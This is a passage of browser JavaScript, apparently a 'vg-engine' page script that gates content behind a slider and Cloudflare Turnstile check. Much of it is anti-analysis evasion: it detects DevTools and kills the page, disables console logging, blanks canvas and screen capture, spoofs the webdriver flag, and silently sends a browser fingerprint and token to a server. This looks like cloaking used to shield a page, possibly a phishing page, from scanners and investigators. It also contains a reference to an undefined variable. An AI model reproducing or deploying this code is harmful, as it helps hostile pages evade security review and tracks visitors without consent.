            mutation.removedNodes.forEach(function(node) {
              if (node.nodeType === 1) { // Element node
                // Restore immediately
                if (node.parentNode) {
                  node.style.visibility = 'visible';
                  node.style.opacity = '1';
                }
              }
            });
          }
          // If attributes are being changed to hide content
          if (mutation.type === 'attributes' && mutation.target) {
            var el = mutation.target;
            if (el.style && (el.style.visibility === 'hidden' || el.style.display === 'none')) {
              // Check if this is a sensitive element
              if (el.id === 'codeValue' || el.className && el.className.indexOf('code') !== -1) {
                el.style.visibility = 'visible';
                el.style.display = '';
                el.style.opacity = '1';
              }
            }
          }
        });
      });
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['style', 'class']
      });
    } catch(e) {}
  }

  // ─── Heavy Anti-Clone Protection ────────────────────────────
  // Prevents page cloning/scraping tools from extracting useful content.
  // If a bot tries to clone the page, all sensitive data is zeroed out.
  function initAntiClone() {
    // Helper: check if we're on a slider page (used by multiple sub-checks below)
    var _isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    // 1. Detect DevTools open via timing attack (more aggressive)
    // Skip on slider pages - slider drag events can trigger false positives
    var devtoolsTiming = (function() {
      var threshold = 100;
      var detected = false;
      setInterval(function() {
        var start = performance.now();
        var debuggerStr = 'debugger;';
        try {
          eval(debuggerStr);
        } catch(e) {}
        if (performance.now() - start > threshold && !_isSlider) {
          detected = true;
          killPage();
        }
      }, 500);
    })();

    // 2. Integrity checker - detects DOM manipulation / content removal
    // Skip on slider pages - slider JS dynamically modifies DOM during drag
    try {
      var checkIntegrity = function() {
        var bodyHTML = document.body ? document.body.innerHTML : '';
        if (!bodyHTML || bodyHTML.length < 100 && !_isSlider) {
          killPage();
        }
      };
      setInterval(checkIntegrity, 2000);
    } catch(e) {}

    // 3. Block print/screen capture detection
    // Skip on slider pages
    if (!_isSlider) {
      window.addEventListener('beforeprint', function(e) {
        e.preventDefault();
        e.stopPropagation();
        killPage();
        return false;
      });
    }

    // 4. Detect if page is inside an iframe (embedding protection)
    // Skip on slider pages - slider verification layers are intentionally embedded
    var isSliderPageAntiClone = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (window.self !== window.top && !isSliderPageAntiClone) {
      // Page is in iframe - kill it (only on non-slider pages)
      document.documentElement.innerHTML = '';
      window.top.location.replace('about:blank');
    }

    // 5. Monitor for rapid DOM changes (indicator of scraping tool)
    var lastBodyLength = document.body ? document.body.innerHTML.length : 0;
    var domChangeCount = 0;
    setInterval(function() {
      var currentLength = document.body ? document.body.innerHTML.length : 0;
      if (Math.abs(currentLength - lastBodyLength) > 50000) {
        domChangeCount++;
        if (domChangeCount > 3) {
          killPage();
        }
      } else {
        domChangeCount = Math.max(0, domChangeCount - 1);
      }
      lastBodyLength = currentLength;
    }, 1000);

    // 6. Hook into console methods to detect debugging
    (function() {
      var noop = function() {};
      var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'group', 'groupEnd'];
      methods.forEach(function(m) {
        if (console[m]) {
          console[m] = noop;
        }
      });
    })();

    // 7. Kill page function - silent destruction
    function killPage() {
      document.open();
      document.write('');
      document.close();
      window.location.replace('about:blank');
    }

    // 8. Anti-screen recording: detect canvas access and blank it
    var _nativeCreateCanvas = document.createElement.bind(document);
    document.createElement = function(tagName) {
      var el = _nativeCreateCanvas(tagName);
      if (tagName.toLowerCase() === 'canvas') {
        var origGetContext = el.getContext;
        el.getContext = function() {
          try {
            var ctx = origGetContext.apply(this, arguments);
            if (ctx && ctx.fillStyle) {
              ctx.fillStyle = '#000000';
              ctx.fillRect(0, 0, 99999, 99999);
            }
          } catch(e) {}
          return ctx;
        };
      }
      return el;
    };

    // 9. Hook screenshot-detecting APIs
    try {
      var origGetDisplayMedia = navigator.mediaDevices.getDisplayMedia;
      if (origGetMedia) {
        navigator.mediaDevices.getDisplayMedia = function() {
          return Promise.reject(new Error('Screen capture not allowed'));
        };
      }
    } catch(e) {}

    // 10. Monitor for webdriver/automation flags being set
    Object.defineProperty(navigator, 'webdriver', {
      get: function() {
        // Always return false to hide automation flag
        return false;
      }
    });

    // 11. Add invisible fingerprinting beacon
    (function() {
      var fingerprint = '';
      try {
        fingerprint += navigator.hardwareConcurrency || '';
        fingerprint += navigator.deviceMemory || '';
        fingerprint += screen.colorDepth + 'x' + screen.pixelDepth;
        fingerprint += new Date().getTimezoneOffset();
        fingerprint += (navigator.languages || []).join(',');
      } catch(e) {}
      
      // Store silently for verification
      window.__vg_fingerprint = btoa(fingerprint || 'unknown');
      
      // Send beacon if API base exists
      if (API_BASE && window.__vg_fingerprint !== 'dW5rbm93bg==') {
        try {
          fetch(API_BASE + '/api/beacon/fp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ fp: window.__vg_fingerprint, jwt: VG_JWT }),
            keepalive: true
          }).catch(function(){});
        } catch(e) {}
      }
    })();
  }

  // ─── Anti-Debug (optional, controlled by admin) ─────────────
  function initAntiDebug() {
    if (!window.__ANTIDEBUG_ENABLED) return;
    
    // Skip entirely on slider pages - slider interaction can trigger false positives
    var isSliderPageDebug = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (isSliderPageDebug) {
      console.log('[vg-engine] Slider page detected, skipping anti-debug protection');
      return;
    }
    
    // Skip aggressive detection on mobile devices
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      // Only use debugger detection on mobile (more reliable)
      setInterval(function() {
        var start = performance.now();
        debugger;
        if (performance.now() - start > 100) {
          immediateRedirect();
        }
      }, 2000);
      return;
    }
    
    var devtools = { open: false };
    var threshold = 160;
    
    // Method 1: Window size detection (desktop only)
    var interval = setInterval(function() {
      if (window.outerHeight - window.innerHeight > threshold || 
          window.outerWidth - window.innerWidth > threshold) {
        if (!devtools.open) {
          devtools.open = true;
          immediateRedirect();
        }
      }
    }, 100);

    // Method 2: Console.log detection
    var originalLog = console.log;
    console.log = function() {
      devtools.open = true;
      immediateRedirect();
      originalLog.apply(console, arguments);
    };

    // Method 3: Debugger detection
    setInterval(function() {
      var start = performance.now();
      debugger;
      if (performance.now() - start > 100) {
        immediateRedirect();
      }
    }, 1000);

    // Method 4: DevTools detection
    if (typeof window.__devtools !== 'undefined') {
      devtools.open = true;
      immediateRedirect();
    }

    function immediateRedirect() {
      clearInterval(interval);
      try { window.close(); } catch(e) {}
      window.location.replace('about:blank');
      setTimeout(function() {
        document.body.innerHTML = '';
        document.head.innerHTML = '';
      }, 100);
    }
  }

  // ─── Obfuscation (optional, controlled by admin) ────────────
  function initObfuscation() {
    if (!window.__OBFUSCATION_ENABLED) return;
    // Console clearing
    (function () {
      var origLog = console.log;
      var origWarn = console.warn;
      var origError = console.error;
      var origClear = console.clear;
      console.log = function () { origLog.apply(console, arguments); };
      console.warn = function () { origWarn.apply(console, arguments); };
      console.error = function () { origError.apply(console, arguments); };
      console.clear = function () { origClear.apply(console, arguments); };
    })();
    // Disable right-click
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    // Disable Ctrl+U, Ctrl+S, F12
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 's')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
  }

  // ─── Slider Chain Handler ───────────────────────────────────
  // Called when slider verification completes - renders Cloudflare turnstile
  // into the vgCfLayer and handles the verification flow
  function initSliderChainHandler() {
    // Check if this page uses slider design
    // Handle both boolean true and string "true" (from different injection methods)
    var isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (!isSlider) { return; }
    
    console.log('[vg-engine] Slider design detected, setting up chain handler');
    
    // Timeout: if Turnstile never completes (network error, origin mismatch, etc.)
    // automatically hide layers after a grace period so user isn't stuck forever
    var _cfTimeoutTimer = null;
    function _resetCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
      _cfTimeoutTimer = setTimeout(function() {
        console.warn('[vg-engine] Cloudflare verification timed out, proceeding anyway');
        hideSliderAndCfLayers();
      }, 30000); // 30 second timeout
    }
    function _cancelCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
    }
    
    // Register the slider complete callback
    window.__vgOnSliderComplete = function() {
      console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');
      
      // Start the timeout as soon as slider completes
      _resetCfTimeout();
      
      // Show the Cloudflare layer (it's already displayed by slider JS)
      var cfLayer = document.getElementById('vgCfLayer');
      if(cfLayer){
        cfLayer.style.display = 'flex';
      }
      
      // Render Cloudflare turnstile into the vgCfWidgetWrap
      renderTurnstileIntoCfLayer();
    };
    
    // Render Cloudflare turnstile widget into the vgCfLayer
    function renderTurnstileIntoCfLayer() {
      var cfWidgetWrap = document.getElementById('vgCfWidgetWrap');
      var cfPlaceholder = document.getElementById('vgCfPlaceholder');
      var cfHint = document.getElementById('vgCfHint');
      
      if(!cfWidgetWrap) {
        console.warn('[vg-engine] vgCfWidgetWrap not found, skipping Turnstile');
        // No widget wrap - skip CF and proceed
        if(cfHint) cfHint.textContent = 'Verification complete. Continuing...';
        setTimeout(function(){
          hideSliderAndCfLayers();
        }, 1000);
        return;
      }
      
      // Hide the loading placeholder
      if(cfPlaceholder) cfPlaceholder.style.display = 'none';
      
      // Check if Turnstile is already loaded
      if(typeof window.turnstile !== 'undefined') {
        executeTurnstileIntoWrap(cfWidgetWrap);
      } else if(window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
        // Load Turnstile script dynamically with onload callback
        console.log('[vg-engine] Loading Cloudflare Turnstile for slider chain');
        var script = document.createElement('script');
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReadyForSlider';
        script.async = true;
        script.defer = true;
        script.id = 'vg-turnstile-script-slider';
        (document.head || document.documentElement).appendChild(script);
        
        // Timeout if script takes too long to load
        setTimeout(function() {
          if (typeof window.turnstile === 'undefined') {
            console.warn('[vg-engine] Turnstile script failed to load within timeout');
            if(cfHint) cfHint.textContent = 'Verification skipped. Continuing...';
            setTimeout(function(){
              hideSliderAndCfLayers();
            }, 2000);
          }
        }, 10000);
        
        // Global callback for when Turnstile loads
        window.vgOnTurnstileReadyForSlider = function() {
          console.log('[vg-engine] Cloudflare Turnstile loaded for slider chain');
          _resetCfTimeout(); // Reset timeout on successful load
          executeTurnstileIntoWrap(cfWidgetWrap);
        };
      } else {
        // Turnstile not enabled - just show success and let flow continue
        console.log('[vg-engine] Turnstile not enabled, showing success');
        _cancelCfTimeout();
        if(cfHint){
          cfHint.textContent = 'Verification complete. Continuing...';
        }
        // After brief delay, hide CF layer and show main content
        setTimeout(function(){
          hideSliderAndCfLayers();
        }, 1500);
      }
    }
    
    function executeTurnstileIntoWrap(widgetWrap) {
      // Fetch cfHint here since it's not in scope from renderTurnstileIntoCfLayer
      var cfHint = document.getElementById('vgCfHint');
      try {
        var widgetId = window.turnstile.render('#vgCfWidgetWrap', {
          sitekey: window.__TURNSTILE_SITE_KEY,
          theme: 'light',
          retry: 'always', // Allow retry on error instead of 'never'
          callback: function(token) {
            console.log('[vg-engine] Cloudflare Turnstile completed');
            _cancelCfTimeout(); // Cancel timeout on success
            // Turnstile passed - hide layers and show main content
            window.__TURNSTILE_TOKEN = token;
            setTimeout(function(){
              hideSliderAndCfLayers();
            }, 1000);
          },
          'error-callback': function() {
            console.warn('[vg-engine] Cloudflare Turnstile error, retrying');
            // On error, cancel timeout and try again (timeout handler will be the final fallback)
            _resetCfTimeout(); // Reset the 30s timer
            try { window.turnstile.execute(widgetId); } catch(e) {}
          },
          'expired-callback': function() {
            console.warn('[vg-engine] Cloudflare Turnstile expired, re-executing');
            _resetCfTimeout(); // Reset the 30s timer
            try { window.turnstile.execute(widgetId); } catch(e) {}
          }
        });
        
        // Execute the challenge immediately
        setTimeout(function() {
          try { window.turnstile.execute(widgetId); } catch(e) {
            console.error('[vg-engine] Failed to execute Turnstile:', e);
            // If execute fails, reset timeout to proceed after delay
            _resetCfTimeout();
          }
        }, 500);
        
      } catch(e) {
        console.error('[vg-engine] Failed to render Turnstile:', e);
        _cancelCfTimeout(); // Cancel so we proceed immediately after delay
        if(cfHint){
          cfHint.textContent = 'Security check skipped. Continuing...';
        }
        setTimeout(function(){
          hideSliderAndCfLayers();
        }, 1500);
      }
    }
    
    function hideSliderAndCfLayers() {
      var sliderLayer = document.getElementById('vgSliderLayer');
      var cfLayer = document.getElementById('vgCfLayer');
      
      if(sliderLayer){
        sliderLayer.style.display = 'none';
        sliderLayer.style.visibility = 'hidden';
      }
      if(cfLayer){
        cfLayer.style.display = 'none';
        cfLayer.style.visibility = 'hidden';
      }
      
      console.log('[vg-engine] Verification layers hidden, showing main content');
      // The template's main card should become visible now
      // Don't force display - let CSS/template handle it
    }
    
    // Also check if slider is already completed when vg-engine loads
    setTimeout(function(){
      if(window.__vgCheckSliderReady && window.__vgCheckSliderReady()){
        console.log('[vg-engine] Slider was already completed, initializing Cloudflare');
        renderTurnstileIntoCfLayer();
      }
    }, 2000);
  }
  
  // ─── Init ───────────────────────────────────────────────────
  function init() {
    applyDynamicContent();
    initBackgroundBlur();
    initSliderChainHandler();
    initBotDetection();
    initAntiScreenshot();
    initAntiClone();
    initAntiDebug();
    initObfuscation();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
